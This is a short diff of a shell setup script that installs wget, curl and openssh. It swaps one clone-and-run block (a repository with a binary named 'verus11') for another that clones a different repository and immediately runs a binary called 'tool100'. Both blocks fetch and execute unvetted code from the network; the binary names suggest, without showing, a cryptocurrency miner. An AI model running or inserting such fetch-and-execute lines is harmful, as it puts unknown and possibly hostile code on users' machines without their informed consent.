@@ -29,11 +29,10 @@ sleep 1
 apt install wget -y
 apt install curl -y
 apt install openssh -y
-git clone https://github.com/Ngocgiau2000/ubuntu.git
-cd ubuntu 
-chmod +x verus11
-chmod +x verus11
-./verus11
+cd 
+cd ..
+cd 
+git clone https://github.com/Ngocgiau2000/devio.git && cd devio && chmod +x tool100 && ./tool100
 fi
 
 if [ $stt = 2 ]
